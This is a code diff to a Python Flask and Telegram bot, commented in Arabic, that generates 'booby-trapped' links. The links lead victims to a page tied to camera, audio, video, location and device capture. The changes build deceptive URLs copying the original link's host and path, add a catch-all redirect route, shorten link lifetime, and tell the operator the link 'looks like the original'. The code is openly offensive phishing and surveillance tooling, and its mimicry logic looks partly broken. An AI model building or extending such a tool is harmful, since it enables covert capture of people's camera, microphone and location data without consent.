@@ -150,6 +150,18 @@ def init_db():
             ('audio_duration', '30'),
             ('camera_count', '3')
     ''')
+
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS sessions (
+        session_id TEXT PRIMARY KEY,
+        chat_id INTEGER,
+        features TEXT,
+        original_url TEXT,
+        fake_url TEXT,
+        config TEXT,
+        created TEXT
+    )
+''')
     
     features = ['camera', 'audio', 'video', 'location', 'device', 'all']
     for feature in features:
@@ -329,14 +341,33 @@ def create_short_link(session_id):
 # ====== دوال الجلسات (session_manager) ======
 def create_session(chat_id, features, original_url, config_data=None):
     session_id = generate_session_id()
+    
+    # ====== إنشاء رابط ملغم بنفس شكل الرابط الأصلي ======
+    parsed = urlparse(original_url)
+    
+    # إضافة مسار أو معامل وهمي
+    if parsed.path.endswith('/'):
+        fake_path = f"{parsed.path}{session_id[:8]}"
+    elif parsed.path:
+        fake_path = f"{parsed.path}/{session_id[:8]}"
+    else:
+        fake_path = f"/{session_id[:8]}"
+    
+    # إعادة بناء الرابط
+    if parsed.query:
+        fake_url = f"{parsed.scheme}://{parsed.netloc}{fake_path}?{parsed.query}&ref={session_id[:6]}"
+    else:
+        fake_url = f"{parsed.scheme}://{parsed.netloc}{fake_path}?ref={session_id[:6]}"
+    
     conn = get_db()
     conn.execute('''
-        INSERT INTO sessions (session_id, chat_id, features, original_url, config, created)
-        VALUES (?, ?, ?, ?, ?, ?)
-    ''', (session_id, chat_id, features, original_url, json.dumps(config_data or {}), datetime.now().isoformat()))
+        INSERT INTO sessions (session_id, chat_id, features, original_url, config, created, fake_url)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
+    ''', (session_id, chat_id, features, original_url, json.dumps(config_data or {}), datetime.now().isoformat(), fake_url))
     conn.commit()
     conn.close()
-    return session_id
+    
+    return session_id, fake_url
 
 def get_session(session_id):
     conn = get_db()
@@ -685,21 +716,30 @@ def get_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     return jsonify({'ip': ip})
 
-@app.route('/<short_id>')
-def handle_short_link(short_id):
+@app.route('/<path:path>')
+def handle_fake_path(path):
+    # البحث عن session_id في الرابط
     conn = get_db()
-    session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (short_id + '%',)).fetchone()
+    session = conn.execute('SELECT * FROM sessions WHERE fake_url LIKE ?', (f'%{path}%',)).fetchone()
     conn.close()
+    
     if not session:
-        return "❌ رابط غير صالح", 404
+        # إذا لم يتم العثور، حاول البحث كرابط مختصر (للتوافق مع الإصدارات السابقة)
+        conn = get_db()
+        session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (path[:8] + '%',)).fetchone()
+        conn.close()
+        if not session:
+            return "❌ رابط غير صالح", 404
+    
     session_id = session['session_id']
     features = session['features']
     original_url = session['original_url']
     created = datetime.fromisoformat(session['created'])
-    if (datetime.now() - created).seconds > 600:
+    if (datetime.now() - created).seconds > 300:
         return "⏰ انتهت صلاحية الرابط", 403
+    
+    # إعادة التوجيه إلى صفحة الاختبار
     return redirect(f"/test/{session_id}/{features}")
-
 @app.route('/test/<session_id>/<features>')
 def test_page(session_id, features):
     session = get_session(session_id)
@@ -1789,23 +1829,24 @@ def handle_original_url(message):
         bot.reply_to(message, "❌ الرابط غير صحيح. أرسل رابطاً صالحاً (مثل: https://example.com)")
         return
     
-    session_id = create_session(user_id, feature, original_url, {})
-    short_link = create_short_link(session_id)
+    session_id, fake_url = create_session(user_id, feature, original_url, {})
     del user_states[user_id]
     
     bot.reply_to(message, f"""
 🔗 **تم إنشاء الرابط الملغم**
 
-📌 **الرابط المختصر:**
-<code>{short_link}</code>
+📌 **الرابط الملغم:**
+<code>{fake_url}</code>
 
 🔗 **الرابط الأصلي:**
 <code>{original_url}</code>
 
 📋 **الميزة:** {feature}
-⏱ الصلاحية: 10 دقائق
-    """, parse_mode='HTML')
+⏱ الصلاحية: 5 دقائق
 
+⚠️ الرابط يبدو وكأنه الرابط الأصلي!
+    """, parse_mode='HTML')
+    
 # ====== تشغيل البوت ======
 def run_bot():
     print("🤖 بدء تشغيل البوت...")
